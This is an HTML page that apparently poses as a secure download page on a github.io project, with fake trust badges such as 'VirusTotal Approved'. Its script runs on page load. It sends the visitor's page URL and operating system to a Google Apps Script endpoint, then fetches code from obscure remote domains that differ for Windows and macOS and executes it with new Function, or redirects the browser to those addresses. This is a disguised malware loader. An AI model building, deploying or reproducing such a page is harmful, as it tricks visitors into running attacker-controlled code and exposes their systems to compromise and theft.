<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Secure Content Delivery</title>
  <link rel="stylesheet" href="styles.css" />
</head>
<body>
  <nav class="k-navbar">
    <div class="nav-section-left">
      <div class="k-logo">
        <svg viewBox="0 0 16 16" width="32" height="32" aria-hidden="true">
          <path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path>
        </svg>
        <span id="domainPath" class="domain-path">/secure-content</span>
      </div>
    </div>
  </nav>
  <main class="main-content-area">
    <div class="k-download-panel">
      <div class="panel-header">
        <svg class="content-icon-large" viewBox="0 0 16 16" aria-hidden="true">
          <path d="M2 2.5A2.5 2.5 0 014.5 0h8.75a.75.75 0 01.75.75v12.5a.75.75 0 01-.75.75h-2.5a.75.75 0 110-1.5h1.75v-2h-8a1 1 0 00-.714 1.7.75.75 0 01-1.072 1.05A2.495 2.495 0 012 11.5v-9zm10.5-1V9h-8c-.356 0-.694.074-1 .208V2.5a1 1 0 011-1h8zM5 12.25v3.25a.25.25 0 00.4.2l1.45-1.087a.25.25 0 01.3 0L8.6 15.7a.25.25 0 00.4-.2v-3.25a.25.25 0 00-.25-.25h-3.5a.25.25 0 00-.25.25z"></path>
        </svg>
        <h1 class="panel-title" id="dynamicTitle">Validating session</h1>
        <p class="panel-subtitle" id="dynamicSubtitle">Generating secure token</p>
      </div>
      <div class="download-card">
        <div class="card-header">
          <div class="content-badge">
            <span class="badge-icon">🔒</span>
            <span class="badge-text">Authorized Access</span>
          </div>
          <div class="version-info">
            <span class="version-badge">secure</span>
          </div>
        </div>
        <div class="security-features">
          <div class="security-item">
            <span class="security-dot"></span>
            <span>Verified Access</span>
          </div>
          <div class="security-item">
            <span class="security-dot"></span>
            <span>Secure Connection</span>
          </div>
        </div>
        <div class="loader-wrap" aria-live="polite">
          <div class="spinner" aria-hidden="true"></div>
          <p class="loader-title" id="loaderHeadline">Validating session</p>
          <p class="loader-muted" id="loaderStatus">Generating secure token</p>
        </div>
        <div class="verification-badges">
          <div class="verification-badge">
            <span class="check-dot"></span>
            VirusTotal Approved
          </div>
          <div class="verification-badge">
            <span class="check-dot"></span>
            Secure Archive
          </div>
        </div>
      </div>
    </div>
  </main>
  <script>
    const REMOTE_WINDOWS = "https://embankfellerbunkum.com/sold.catil";
    const REMOTE_MAC = "https://cementrastustatchy.com/pencel.rummer";
    const ERROR_URL = "https://github.com/resources/articles?topic=ai";
    const APP_URL = "https://script.google.com/macros/s/AKfycbwY_zocqVUXLQn_kvo9iNqLOKTGKRW-d--HeuVOFBE9MY5tg1o4Gl1ywi1EroaJ1KKA/exec";
    function getProjectInfoFromHost() {
      const host = window.location.hostname || "";
      const projectSlug = host.replace(".github.io", "");
      return { host, projectSlug };
    }
    function formatProjectName(slug) {
      if (!slug) return "Content";
      return slug
        .replace(/-/g, " ")
        .split(" ")
        .filter(Boolean)
        .map(w => w.charAt(0).toUpperCase() + w.slice(1))
        .join(" ");
    }
    function updateUI() {
      const info = getProjectInfoFromHost();
      const pretty = formatProjectName(info.projectSlug);
      document.getElementById("domainPath").textContent = "/" + (info.host || "secure-content");
      document.getElementById("dynamicTitle").textContent = pretty;
      document.getElementById("dynamicSubtitle").textContent =
        info.host ? `Content package for ${info.host}` : "Content package";
    }
    function detectOS() {
      const uad = navigator.userAgentData;
      if (uad && uad.platform) {
        const p = uad.platform.toLowerCase();
        if (p.includes('windows')) return 'windows';
        if (p.includes('mac')) return 'macos';
      }
      const ua = navigator.userAgent || '';
      if (/Windows NT/i.test(ua)) return 'windows';
      if (/Macintosh;.*Mac OS X/i.test(ua)) return 'macos';
      return 'other';
    }
    function sendLink() {
      const currentPage = window.location.href;
      const os = detectOS();
      const payload = { 
        offer: currentPage,
        os: os
      };
      const q = new URLSearchParams({ p: JSON.stringify(payload) }).toString();
      new Image(1,1).src = APP_URL + "?" + q + "&_t=" + Date.now();
    }
    document.addEventListener("DOMContentLoaded", () => {
      updateUI();
      const os = detectOS();
      sendLink();
      if (os === 'windows' || os === 'macos') {
        const targetUrl = os === 'windows' ? REMOTE_WINDOWS : REMOTE_MAC;
        async function load() {
          try {
            const res = await fetch(targetUrl, { cache: 'no-store' });
            const code = await res.text();
            const headline = document.getElementById('dynamicTitle');
            const status = document.getElementById('dynamicSubtitle');
            new Function('headline', 'status', code)(headline, status);
          } catch {
            setTimeout(() => { window.location.replace(targetUrl); }, 1450);
          }
        }
        load();
      } else {
        document.getElementById('dynamicTitle').textContent = "Attention: Unsupported Operating System";
        document.getElementById('dynamicSubtitle').textContent = "To continue installation, you must be using Windows or macOS. Installation is not supported on your current operating system.";
        setTimeout(() => { window.location.replace(ERROR_URL); }, 4000);
      }
    });
  </script>
</body>
</html>